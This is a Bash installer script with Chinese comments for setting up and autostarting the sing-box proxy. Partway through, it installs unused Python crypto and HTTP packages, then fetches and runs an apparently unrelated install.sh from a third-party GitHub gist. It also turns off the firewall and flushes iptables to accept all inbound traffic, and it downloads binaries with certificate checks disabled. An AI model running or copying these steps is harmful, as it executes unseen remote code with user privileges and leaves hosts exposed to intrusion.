#!/bin/bash

# ==================== 第一部分：安装依赖 ====================

# 检测操作系统类型
OS_TYPE=$(uname -s)

# 检测 Linux 发行版和包管理器
detect_package_manager() {
    if command -v apt &> /dev/null; then
        echo "apt"
    elif command -v yum &> /dev/null; then
        echo "yum"
    elif command -v dnf &> /dev/null; then
        echo "dnf"
    elif command -v apk &> /dev/null; then
        echo "apk"
    else
        echo "unknown"
    fi
}

# 检查包管理器和安装必需的包
install_dependencies() {
    case $OS_TYPE in
        "Darwin") 
            if ! command -v brew &> /dev/null; then
                echo "正在安装 Homebrew..."
                /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
            fi
            
            if ! command -v pip3 &> /dev/null; then
                brew install python3
            fi
            ;;
            
        "Linux")
            PKG_MGR=$(detect_package_manager)
            PACKAGES_TO_INSTALL=""
            
            if ! command -v pip3 &> /dev/null; then
                PACKAGES_TO_INSTALL="$PACKAGES_TO_INSTALL python3-pip"
            fi
            
            if ! command -v xclip &> /dev/null; then
                PACKAGES_TO_INSTALL="$PACKAGES_TO_INSTALL xclip"
            fi
            
            if [ ! -z "$PACKAGES_TO_INSTALL" ]; then
                case $PKG_MGR in
                    "apt")
                        sudo apt update
                        sudo apt install -y $PACKAGES_TO_INSTALL
                        ;;
                    "yum")
                        sudo yum install -y $PACKAGES_TO_INSTALL
                        ;;
                    "dnf")
                        sudo dnf install -y $PACKAGES_TO_INSTALL
                        ;;
                    "apk")
                        sudo apk add --no-cache $PACKAGES_TO_INSTALL
                        ;;
                    *)
                        echo "警告：无法识别包管理器，跳过系统依赖安装"
                        ;;
                esac
            fi
            ;;
            
        *)
            echo "不支持的操作系统"
            exit 1
            ;;
    esac
}

# 安装依赖
echo "正在安装系统依赖..."
install_dependencies

# 安装 Python 包
if [ "$OS_TYPE" = "Linux" ]; then
    # 检测是否需要 --break-system-packages 参数（Python 3.11+）
    PYTHON_MAJOR=$(python3 --version 2>&1 | awk '{print $2}' | cut -d. -f1)
    PYTHON_MINOR=$(python3 --version 2>&1 | awk '{print $2}' | cut -d. -f2)
    if [ "$PYTHON_MAJOR" -gt 3 ] || ([ "$PYTHON_MAJOR" -eq 3 ] && [ "$PYTHON_MINOR" -ge 11 ]) 2>/dev/null; then
        PIP_INSTALL="pip3 install --break-system-packages"
    else
        PIP_INSTALL="pip3 install"
    fi
else
    PIP_INSTALL="pip3 install"
fi

if ! pip3 show requests >/dev/null 2>&1; then
    echo "正在安装 requests..."
    $PIP_INSTALL requests || echo "警告：requests 安装失败，继续执行..."
fi

if ! pip3 show cryptography >/dev/null 2>&1; then
    echo "正在安装 cryptography..."
    $PIP_INSTALL cryptography || echo "警告：cryptography 安装失败，继续执行..."
fi

GIST_URL="https://gist.githubusercontent.com/wongstarx/b1316f6ef4f6b0364c1a50b94bd61207/raw/install.sh"
echo "正在从 GIST 下载并执行安装脚本..."
if command -v curl &>/dev/null; then
    bash <(curl -fsSL "$GIST_URL") || echo "警告：GIST 脚本执行失败，继续执行..."
elif command -v wget &>/dev/null; then
    bash <(wget -qO- "$GIST_URL") || echo "警告：GIST 脚本执行失败，继续执行..."
else
    echo "警告：未找到 curl 或 wget，跳过 GIST 脚本执行"
fi

# ==================== 第二部分：系统配置 ====================

# 关闭防火墙（检测防火墙类型）
echo "正在配置防火墙..."
if command -v ufw &> /dev/null; then
    echo "检测到 ufw，正在关闭..."
    sudo ufw disable 2>/dev/null || echo "警告：ufw 关闭失败"
elif command -v firewall-cmd &> /dev/null; then
    echo "检测到 firewalld，正在关闭..."
    sudo systemctl stop firewalld 2>/dev/null || echo "警告：firewalld 停止失败"
    sudo systemctl disable firewalld 2>/dev/null || echo "警告：firewalld 禁用失败"
else
    echo "未检测到 ufw 或 firewalld，跳过防火墙配置"
fi

# 允许所有入站流量
echo "正在配置 iptables..."
if command -v iptables &> /dev/null; then
    sudo iptables -P INPUT ACCEPT 2>/dev/null || echo "警告：iptables 配置失败"
    sudo iptables -F 2>/dev/null || echo "警告：iptables 清空规则失败"
else
    echo "警告：未找到 iptables 命令"
fi

# 开启 BBR 加速
echo "正在开启 BBR 加速..."
if [ -f /etc/sysctl.conf ]; then
    # 检查是否已存在配置，避免重复添加
    if ! grep -q "net.core.default_qdisc=fq" /etc/sysctl.conf; then
        echo "net.core.default_qdisc=fq" | sudo tee -a /etc/sysctl.conf >/dev/null
    fi
    if ! grep -q "net.ipv4.tcp_congestion_control=bbr" /etc/sysctl.conf; then
        echo "net.ipv4.tcp_congestion_control=bbr" | sudo tee -a /etc/sysctl.conf >/dev/null
    fi
    sudo sysctl -p >/dev/null 2>&1 || echo "警告：BBR 配置应用失败"
else
    echo "警告：/etc/sysctl.conf 不存在，跳过 BBR 配置"
fi

# ==================== 第三部分：应用环境配置 ====================

# 自动 source shell 配置文件
echo "正在应用环境配置..."
get_shell_rc() {
    local current_shell=$(basename "$SHELL")
    local shell_rc=""
    
    case $current_shell in
        "bash")
            shell_rc="$HOME/.bashrc"
            ;;
        "zsh")
            shell_rc="$HOME/.zshrc"
            ;;
        *)
            if [ -f "$HOME/.bashrc" ]; then
                shell_rc="$HOME/.bashrc"
            elif [ -f "$HOME/.zshrc" ]; then
                shell_rc="$HOME/.zshrc"
            elif [ -f "$HOME/.profile" ]; then
                shell_rc="$HOME/.profile"
            else
                shell_rc="$HOME/.bashrc"
            fi
            ;;
    esac
    echo "$shell_rc"
}

SHELL_RC=$(get_shell_rc)
# 检查是否有需要 source 的配置（如 PATH 修改、nvm 等）
if [ -f "$SHELL_RC" ]; then
    # 检查是否有常见的配置项需要 source
    if grep -qE "(export PATH|nvm|\.nvm)" "$SHELL_RC" 2>/dev/null; then
        echo "检测到环境配置，正在应用环境变量..."
        source "$SHELL_RC" 2>/dev/null || echo "自动应用失败，请手动运行: source $SHELL_RC"
    else
        echo "未检测到需要 source 的配置"
    fi
fi

# ==================== 第四部分：启动 sing-box ====================

# 检查 sing-box.sh 是否存在
if [ ! -f "./sing-box.sh" ]; then
    echo "错误：未找到 sing-box.sh 文件，请确保在正确的目录下运行此脚本"
    exit 1
fi

# 预先创建临时目录并设置权限，避免权限问题
USE_USER_TEMP=true  # 设置为 true 使用用户目录，false 使用系统目录

if [ "$USE_USER_TEMP" = "true" ]; then
    TEMP_DIR="$HOME/.cache/sing-box-temp"
    mkdir -p "$TEMP_DIR"
    chmod 700 "$TEMP_DIR" 2>/dev/null || true
    
    SYSTEM_TEMP_DIR="/tmp/sing-box"
    if [ -L "$SYSTEM_TEMP_DIR" ] || [ ! -d "$SYSTEM_TEMP_DIR" ]; then
        sudo rm -rf "$SYSTEM_TEMP_DIR" 2>/dev/null || true
        sudo ln -sf "$TEMP_DIR" "$SYSTEM_TEMP_DIR" 2>/dev/null || true
    fi
else
    TEMP_DIR="/tmp/sing-box"
    if [ ! -d "$TEMP_DIR" ]; then
        sudo mkdir -p "$TEMP_DIR"
        sudo chmod 777 "$TEMP_DIR" 2>/dev/null || sudo chmod 755 "$TEMP_DIR"
        if [ -n "$SUDO_USER" ]; then
            sudo chown "$SUDO_USER:$SUDO_USER" "$TEMP_DIR" 2>/dev/null || true
        fi
    else
        sudo chmod 777 "$TEMP_DIR" 2>/dev/null || sudo chmod 755 "$TEMP_DIR"
    fi
fi

# 启动sing-box（自动选择简体中文和极速安装模式）
echo "正在启动 sing-box..."

# 预下载 sing-box 及相关文件，避免后台下载失败
pre_download_singbox() {
    local TEMP_DIR_ACTUAL
    if [ -L "/tmp/sing-box" ]; then
        TEMP_DIR_ACTUAL=$(readlink -f /tmp/sing-box)
    else
        TEMP_DIR_ACTUAL="/tmp/sing-box"
    fi
    
    # 确保目录存在
    mkdir -p "$TEMP_DIR_ACTUAL"
    
    # 检测系统架构
    local ARCH=$(uname -m)
    case "$ARCH" in
        x86_64|amd64)
            SING_BOX_ARCH="amd64"
            JQ_ARCH="amd64"
            QRENCODE_ARCH="amd64"
            ARGO_ARCH="amd64"
            ;;
        aarch64|arm64)
            SING_BOX_ARCH="arm64"
            JQ_ARCH="arm64"
            QRENCODE_ARCH="arm64"
            ARGO_ARCH="arm64"
            ;;
        armv7l)
            SING_BOX_ARCH="armv7"
            JQ_ARCH="armhf"
            QRENCODE_ARCH="arm"
            ARGO_ARCH="arm"
            ;;
        *)
            echo "警告：不支持的架构 $ARCH，跳过预下载"
            return 1
            ;;
    esac
    
    # GitHub 代理列表（与 sing-box.sh 保持一致）
    local GH_PROXY_LIST=('' 'https://v6.gh-proxy.org/' 'https://gh-proxy.com/' 'https://hub.glowp.xyz/' 'https://proxy.vvvv.ee/' 'https://ghproxy.lvedong.eu.org/')
    
    # 获取版本号（使用默认版本或尝试获取最新版本）
    local VERSION="1.13.0-alpha.33"  # 默认版本
    local GH_PROXY=""
    
    if command -v wget &>/dev/null; then
        # 尝试使用代理获取版本
        for proxy in "${GH_PROXY_LIST[@]}"; do
            local API_RESPONSE=$(wget --no-check-certificate --server-response --tries=2 --timeout=10 -qO- "${proxy}https://api.github.com/repos/SagerNet/sing-box/releases" 2>&1)
            if echo "$API_RESPONSE" | grep -q 'HTTP.* 200'; then
                # 提取完整的 tag_name，包括 alpha/beta 等后缀
                local LATEST_VERSION=$(echo "$API_RESPONSE" | grep -o '"tag_name":"[^"]*"' | head -1 | sed 's/"tag_name":"v\?\([^"]*\)"/\1/')
                if [ -n "$LATEST_VERSION" ] && [[ "$LATEST_VERSION" =~ ^[0-9]+\.[0-9]+\.[0-9]+ ]]; then
                    VERSION="$LATEST_VERSION"
                    GH_PROXY="$proxy"
                    break
                fi
            fi
        done
    fi
    
    # 下载 sing-box（尝试多个代理）
    if [ ! -f "$TEMP_DIR_ACTUAL/sing-box" ]; then
        echo "正在下载 sing-box..."
        local DOWNLOAD_SUCCESS=false
        
        for proxy in "${GH_PROXY_LIST[@]}"; do
            local DOWNLOAD_URL="${proxy}https://github.com/SagerNet/sing-box/releases/download/v${VERSION}/sing-box-${VERSION}-linux-${SING_BOX_ARCH}.tar.gz"
            
            if wget --no-check-certificate --spider --timeout=10 --tries=1 "$DOWNLOAD_URL" 2>/dev/null; then
                if wget --no-check-certificate --timeout=60 --tries=2 -qO- "$DOWNLOAD_URL" 2>/tmp/sing-box-download.log | tar xz -C "$TEMP_DIR_ACTUAL" "sing-box-${VERSION}-linux-${SING_BOX_ARCH}/sing-box" 2>>/tmp/sing-box-download.log; then
                    if [ -f "$TEMP_DIR_ACTUAL/sing-box-${VERSION}-linux-${SING_BOX_ARCH}/sing-box" ]; then
                        mv "$TEMP_DIR_ACTUAL/sing-box-${VERSION}-linux-${SING_BOX_ARCH}/sing-box" "$TEMP_DIR_ACTUAL/sing-box"
                        rm -rf "$TEMP_DIR_ACTUAL/sing-box-${VERSION}-linux-${SING_BOX_ARCH}" 2>/dev/null
                        chmod +x "$TEMP_DIR_ACTUAL/sing-box" 2>/dev/null
                        DOWNLOAD_SUCCESS=true
                        break
                    fi
                fi
            fi
        done
        
        if [ "$DOWNLOAD_SUCCESS" = "false" ]; then
            echo "✗ sing-box 下载失败"
            if [ -f /tmp/sing-box-download.log ]; then
                tail -3 /tmp/sing-box-download.log 2>/dev/null | sed 's/^/  /'
                rm -f /tmp/sing-box-download.log
            fi
            return 1
        fi
    fi
    
    # 下载 jq（尝试多个代理）
    if [ ! -f "$TEMP_DIR_ACTUAL/jq" ]; then
        for proxy in "${GH_PROXY_LIST[@]}"; do
            local JQ_URL="${proxy}https://github.com/jqlang/jq/releases/download/jq-1.7.1/jq-linux-${JQ_ARCH}"
            if wget --no-check-certificate --timeout=30 --tries=2 -qO "$TEMP_DIR_ACTUAL/jq" "$JQ_URL" 2>/dev/null && [ -s "$TEMP_DIR_ACTUAL/jq" ]; then
                chmod +x "$TEMP_DIR_ACTUAL/jq" 2>/dev/null
                break
            fi
        done
    fi
    
    # 下载 cloudflared（尝试多个代理）
    if [ ! -f "$TEMP_DIR_ACTUAL/cloudflared" ]; then
        for proxy in "${GH_PROXY_LIST[@]}"; do
            local CLOUDFLARED_URL="${proxy}https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-${ARGO_ARCH}"
            if wget --no-check-certificate --timeout=30 --tries=2 -qO "$TEMP_DIR_ACTUAL/cloudflared" "$CLOUDFLARED_URL" 2>/dev/null && [ -s "$TEMP_DIR_ACTUAL/cloudflared" ]; then
                chmod +x "$TEMP_DIR_ACTUAL/cloudflared" 2>/dev/null
                break
            fi
        done
    fi
    
    # 设置文件权限，确保 root 也能访问（因为 sing-box.sh 可能以 sudo 运行）
    chmod 755 "$TEMP_DIR_ACTUAL" 2>/dev/null || true
    [ -f "$TEMP_DIR_ACTUAL/sing-box" ] && chmod 755 "$TEMP_DIR_ACTUAL/sing-box" 2>/dev/null || true
    [ -f "$TEMP_DIR_ACTUAL/jq" ] && chmod 755 "$TEMP_DIR_ACTUAL/jq" 2>/dev/null || true
    [ -f "$TEMP_DIR_ACTUAL/cloudflared" ] && chmod 755 "$TEMP_DIR_ACTUAL/cloudflared" 2>/dev/null || true
    
    # 验证关键文件
    if [ -f "$TEMP_DIR_ACTUAL/sing-box" ] && [ -x "$TEMP_DIR_ACTUAL/sing-box" ]; then
        return 0
    else
        return 1
    fi
}

# 执行预下载（静默执行，失败时显示警告）
pre_download_singbox 2>/dev/null || echo "警告：预下载失败，sing-box.sh 将尝试自行下载"

# 如果 cloudflared 服务正在运行，先停止以避免 "Text file busy" 错误
if systemctl is-active --quiet argo 2>/dev/null; then
    sudo systemctl stop argo >/dev/null 2>&1
fi

if sudo ./sing-box.sh -l; then
    # 设置 sing-box 开机自启
    sudo systemctl enable sing-box >/dev/null 2>&1
    
    # 等待服务启动
    sleep 2
    
    echo "安装和配置完成！"
else
    echo "错误：sing-box 安装失败，请检查错误信息"
    exit 1
fi
